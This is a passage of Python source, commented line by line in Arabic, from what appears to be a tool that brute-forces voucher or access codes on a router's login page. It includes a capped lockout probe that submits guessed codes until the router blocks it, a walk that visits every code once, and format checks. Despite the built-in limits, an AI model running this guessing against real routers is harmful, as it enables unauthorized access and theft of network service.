            "plan": self.plan,  # مفتاح plan في القاموس
            "result": {"stop_reason": self.stop_reason, "hits": self.hits,  # مفتاح result في القاموس
                       "state": self.state, "error": self.error},  # مفتاح state في القاموس
            "ban_evidence": self._last_ban_evidence,  # مفتاح ban_evidence في القاموس
            "counters": status["counters"],  # مفتاح counters في القاموس
            "reason_counts": status.get("reason_counts", {}),  # مفتاح reason_counts في القاموس
            "net_kinds": status["net_kinds"],  # مفتاح net_kinds في القاموس
            "progress": status["progress"],  # مفتاح progress في القاموس
            "speed": status["speed"], "elapsed": status["elapsed"],  # مفتاح speed في القاموس
            "latency": status["latency"],  # مفتاح latency في القاموس
            "throttle_events": self.throttle["events"],  # مفتاح throttle_events في القاموس
            "calibration": self.calibration,  # مفتاح calibration في القاموس
            "internet_opened": self._internet_opened,  # مفتاح internet_opened في القاموس
            "review_files": [r.get("file") for r in self.review],  # مفتاح review_files في القاموس
            "profile_snapshot": safe_profile_snapshot(self.profile),  # مفتاح profile_snapshot في القاموس
        }  # إغلاق القوس المفتوح في السطر السابق
        try:  # بدايةtry محمية (يليها except/finally)
            path = self.store.save_run(report)  # إسناد نتيجة استدعاء self.store.save_run (معامل واحد) إلى path
            self.emit("report", {"file": os.path.basename(path)})  # استدعاء self.emit (2 معاملات)
        # تكملة السطر السابق داخل القوس
        except Exception:                                 # noqa: BLE001
            pass  # سطر فارغ منطقياً (pass) — مطلوب صياغياً


# خطوة أولية نسبياً مع حجم الفضاء حتى يزور المسار كل بطاقة مرة واحدة.
def _coprime(space: int) -> int:  # تعريف الدالة _coprime(space) ترجع int
    """A step that visits every index exactly once before repeating."""  # نص توثيقي (docstring) يشرح ما يليه
    import math  # استيراد الوحدة math من المكتبة
    if space <= 2:  # شرط: space أصغر أو يساوي 2
        return 1  # إرجاع 1
    while True:  # حلقة ما دام True
        a = random.randrange(1, space)  # إسناد نتيجة استدعاء random.randrange (2 معاملات) إلى a
        if math.gcd(a, space) == 1:  # شرط: math.gcd(a, space) يساوي 1
            return a  # إرجاع a


def _retry_after(resp) -> int:  # تعريف الدالة _retry_after(resp) ترجع int
    try:  # بدايةtry محمية (يليها except/finally)
        value = int((resp.header("retry-after") or "0").strip())  # إسناد نتيجة استدعاء int (معامل واحد) إلى value
        return max(0, min(value, 30))  # إرجاع max(0, min(value, 30))
    except Exception:  # تكملة السطر السابق داخل القوس
        return 0  # إرجاع 0


# ---------------------------------------------------------------------------
# كم يسامح هذا الراوتر؟ (قس الحماية، لا تحاربها)
# ---------------------------------------------------------------------------
# قياس مدى تسامح الراوتر: محدود بـ8 فشل ويتوقف عند أول رد حماية.
# wait_limit وstep مقبولان للتوافق لكنهما متجاهلان عمداً: لا ننتظر زوال الحجب.
def probe_lockout(profile: dict, checks=None, max_failures: int = 30,  # تعريف الدالة probe_lockout(profile, checks, max_failures, wait_limit, step, pace, log) ترجع dict
                  wait_limit: float = 240.0, step: float = 10.0,  # مفتاح wait_limit في القاموس
                  pace: float = 0.4, log=None) -> dict:  # مفتاح pace في القاموس
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """Run a capped, explicit diagnostic and stop at the first protective reply.

    The legacy wait_limit and step parameters are accepted for API compatibility
    but intentionally ignored: this diagnostic never waits for expiry or tests
    another card after a block, rate limit, or CAPTCHA.
    """  # نهاية النص متعدد الأسطر
    p = store.migrate(profile)  # إسناد نتيجة استدعاء store.migrate (معامل واحد) إلى p
    say = log or (lambda *a, **k: None)  # دمج منطقي (أو) وإسناده إلى say
    out = {"ok": False, "error": "", "tried": 0, "ban_after": None,  # إسناد قاموس إلى out
           "clears_after": None, "safe_delay_ms": None, "steps": [],  # مفتاح clears_after في القاموس
           "max_failures": int(max_failures), "waited": 0.0}  # مفتاح max_failures في القاموس

    def step_row(step_id, ok, reason, detail=None):  # تعريف الدالة step_row(step_id, ok, reason, detail)
        out["steps"].append({"id": step_id, "ok": ok, "reason": reason,  # استدعاء out['steps'].append (معامل واحد)
                             "detail": detail or {}})  # مفتاح detail في القاموس

    if store.space_size(p) <= 0:  # شرط: store.space_size(p) أصغر أو يساوي 0
        out["error"] = "card_space_empty"  # إسناد القيمة الثابتة out['error']
        step_row("profile_valid", False, "card_space_empty", {})  # استدعاء step_row (4 معاملات)
        return out  # إرجاع out

    session = new_session(headers=browser_headers(p, p["login_url"]))  # إسناد نتيجة استدعاء new_session (headers=…) إلى session
    try:  # بدايةtry محمية (يليها except/finally)
        try:  # بدايةtry محمية (يليها except/finally)
            resp = session.get(p["login_url"], allow_redirects=True)  # إسناد نتيجة استدعاء session.get (معامل واحد، allow_redirects=…) إلى resp
        # تكملة السطر السابق داخل القوس
        except Exception as exc:                        # noqa: BLE001
            err = classify(exc, p["login_url"])  # إسناد نتيجة استدعاء classify (2 معاملات) إلى err
            out["error"] = err.kind  # إسناد err.kind إلى out['error']
            step_row("reach_login_page", False, f"net_{err.kind}",  # استدعاء step_row (4 معاملات)
                     {"text": err.text[:200]})  # تكملة السطر السابق داخل القوس
            return out  # إرجاع out
        p["login_url"] = resp.url or p["login_url"]  # دمج منطقي (أو) وإسناده إلى p['login_url']
        p = absorb_form(p, resp.text or "", p["login_url"])  # إسناد نتيجة استدعاء absorb_form (3 معاملات) إلى p

        def blocked(r) -> tuple:  # تعريف الدالة blocked(r) ترجع tuple
            """Protective block/rate-limit/CAPTCHA page, with evidence."""  # نص توثيقي (docstring) يشرح ما يليه
            stop, word, ban_ev = _is_protective_reply(r, p["login_url"])  # إسناد نتيجة استدعاء _is_protective_reply (2 معاملات) إلى مجموعة
            return stop, word, ban_ev  # إرجاع مجموعة

        is_block, word, ban_ev = blocked(resp)  # إسناد نتيجة استدعاء blocked (معامل واحد) إلى مجموعة
        if is_block:  # شرط: is_block
            out["error"] = ("captcha_challenge" if word == "captcha_challenge"  # إسناد 'captcha_challenge' إن مقارنة وإلا 'blocked_from_the_start' إلى out['error']
                            else "blocked_from_the_start")  # تكملة السطر السابق داخل القوس
            step_row("reach_login_page", False, out["error"],  # استدعاء step_row (4 معاملات)
                     {"status": resp.status, "word": word,  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                      "ban_evidence": ban_ev})  # مفتاح ban_evidence في القاموس
            return out  # إرجاع out
        step_row("reach_login_page", True, "http_ok", {"status": resp.status})  # استدعاء step_row (4 معاملات)

        # --- 1. فحص محدود وبإذن صريح؛ توقّف عند أول رد حجب ------
        space = store.space_size(p)  # إسناد نتيجة استدعاء store.space_size (معامل واحد) إلى space
        limit = max(0, min(int(max_failures), config.LOCKOUT_PROBE_MAX_FAILURES))  # إسناد نتيجة استدعاء max (2 معاملات) إلى limit
        out["max_failures"] = limit  # إسناد limit إلى out['max_failures']
        failures = 0  # إسناد القيمة الثابتة failures
        for i in range(limit):  # دورة على range(limit) باسم i
            card = store.decode_card(p, i % space)  # إسناد نتيجة استدعاء store.decode_card (2 معاملات) إلى card
            try:  # بدايةtry محمية (يليها except/finally)
                r = send_login(session, p, card)  # إسناد نتيجة استدعاء send_login (3 معاملات) إلى r
            # تكملة السطر السابق داخل القوس
            except Exception as exc:                    # noqa: BLE001
                err = classify(exc, p["login_url"])  # إسناد نتيجة استدعاء classify (2 معاملات) إلى err
                out["error"] = err.kind  # إسناد err.kind إلى out['error']
                step_row("failures", False, f"net_{err.kind}",  # استدعاء step_row (4 معاملات)
                         {"text": err.text[:160], "failures": failures})  # تكملة السطر السابق داخل القوس
                return out  # إرجاع out
            failures += 1  # تحديث failures بعملية جمع
            is_block, word, ban_ev = blocked(r)  # إسناد نتيجة استدعاء blocked (معامل واحد) إلى مجموعة
            if is_block:  # شرط: is_block
                # الطلب الذي أرجع الصفحة الوقائية لم يُحكم عليه.
                # سجّله وتوقّف؛ لا تستطلع زوال الحجب أبداً ولا تجرّب بطاقة أخرى.
                out["tried"] = failures  # إسناد failures إلى out['tried']
                out["ban_evidence"] = ban_ev  # إسناد ban_ev إلى out['ban_evidence']
                if word == "captcha_challenge":  # شرط: word يساوي 'captcha_challenge'
                    out["error"] = "captcha_challenge"  # إسناد القيمة الثابتة out['error']
                    step_row("failures", False, "captcha_challenge",  # استدعاء step_row (4 معاملات)
                             {"failures": failures, "status": r.status,  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                              "ban_evidence": ban_ev})  # مفتاح ban_evidence في القاموس
                    return out  # إرجاع out
                out["ban_after"] = max(0, failures - 1)  # إسناد نتيجة استدعاء max (2 معاملات) إلى out['ban_after']
                out["ok"] = True  # إسناد القيمة الثابتة out['ok']
                step_row("failures", True, "blocked_after",  # استدعاء step_row (4 معاملات)
                         {"failures": failures, "forgiven": out["ban_after"],  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                          "status": r.status, "word": word,  # مفتاح status في القاموس
                          "ban_evidence": ban_ev})  # مفتاح ban_evidence في القاموس
                step_row("recovery", False, "not_probed_after_lockout",  # استدعاء step_row (4 معاملات)
                         {"advice": "stop_and_contact_network_admin"})  # تكملة السطر السابق داخل القوس
                return out  # إرجاع out
            p = absorb_form(p, r.text or "", r.url or p["login_url"])  # إسناد نتيجة استدعاء absorb_form (3 معاملات) إلى p
            time.sleep(max(0.0, min(float(pace), 1.0)))  # استدعاء time.sleep (معامل واحد)
        out["tried"] = failures  # إسناد failures إلى out['tried']
        out["ok"] = True  # إسناد القيمة الثابتة out['ok']
        step_row("failures", True, "no_block_within_safe_limit",  # استدعاء step_row (4 معاملات)
                 {"failures": failures, "limit": limit})  # تكملة السطر السابق داخل القوس
        return out  # إرجاع out
    finally:  # مفتاح finally في القاموس
        session.close()  # استدعاء session.close


def known_card_problem(p: dict, card: str) -> dict:  # تعريف الدالة known_card_problem(p, card) ترجع dict
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """Does this card even fit the format we were asked to guess?

    A known card that does not match the prefix/length/charset can never be
    sent by the walk, so the tuning step is doomed from the start - better to
    say exactly what is wrong.
    """  # نهاية النص متعدد الأسطر
    card = (card or "").strip()  # إسناد نتيجة استدعاء card أو ''.strip إلى card
    if not card:  # شرط معكوس: ليس card
        return {}  # إرجاع قاموس
    prefix = p.get("prefix", "") or ""  # دمج منطقي (أو) وإسناده إلى prefix
    suffix = p.get("suffix", "") or ""  # دمج منطقي (أو) وإسناده إلى suffix
    length = int(p.get("length") or 0)  # إسناد نتيجة استدعاء int (معامل واحد) إلى length
    charset = set(p.get("charset") or "")  # إسناد نتيجة استدعاء set (معامل واحد) إلى charset
    if length and len(card) != length:  # شرط مركّب (و)
        return {"reason": "length_mismatch", "card_length": len(card),  # إرجاع قاموس
                "profile_length": length}  # مفتاح profile_length في القاموس
    if prefix and not card.startswith(prefix):  # شرط مركّب (و)
        return {"reason": "prefix_mismatch", "prefix": prefix}  # إرجاع قاموس
    if suffix and not card.endswith(suffix):  # شرط مركّب (و)
        return {"reason": "suffix_mismatch", "suffix": suffix}  # إرجاع قاموس
    if charset:  # شرط: charset
        middle = card[len(prefix):len(card) - len(suffix) if suffix else len(card)]  # إسناد card[] إلى middle
        alien = sorted(set(middle) - charset)  # إسناد نتيجة استدعاء sorted (معامل واحد) إلى alien
        if alien:  # شرط: alien
            return {"reason": "charset_mismatch", "chars": "".join(alien)[:20],  # إرجاع قاموس
                    "charset": "".join(sorted(charset))[:40]}  # مفتاح charset في القاموس
    return {}  # إرجاع قاموس


def _summarise_trials(trials: list, limit: int = 8) -> list:  # تعريف الدالة _summarise_trials(trials, limit) ترجع list
    """Keep safe request shapes and response evidence, in request order."""  # نص توثيقي (docstring) يشرح ما يليه
    out = []  # إسناد قائمة إلى out
    for t in trials[:limit]:  # دورة على trials[] باسم t
        out.append({  # استدعاء out.append (معامل واحد)
            "method": t.get("method", ""),  # مفتاح method في القاموس
            "url": t.get("url", ""),  # مفتاح url في القاموس
            "field_names": list(t.get("field_names") or []),  # مفتاح field_names في القاموس
            "body_field_names": list(t.get("body_field_names") or []),  # مفتاح body_field_names في القاموس
            "mode": t.get("mode", ""),  # مفتاح mode في القاموس
            "dst": (t.get("dst") or "")[:120],  # مفتاح dst في القاموس
            "status": t.get("status"), "code": t.get("code", ""),  # مفتاح status في القاموس
            "reason": t.get("reason", ""), "word": t.get("word", ""),  # مفتاح reason في القاموس
            "response_bytes": t.get("response_bytes"),  # مفتاح response_bytes في القاموس
            "content_type": t.get("content_type", ""),  # مفتاح content_type في القاموس
            "location": (t.get("location") or "")[:160],  # مفتاح location في القاموس
            "internet_before": t.get("internet_before", ""),  # مفتاح internet_before في القاموس
            "internet_after": t.get("internet_after", ""),  # مفتاح internet_after في القاموس
            "online_transition": bool(t.get("online_transition")),  # مفتاح online_transition في القاموس
            "logout": t.get("logout")})  # مفتاح logout في القاموس
    return out  # إرجاع out
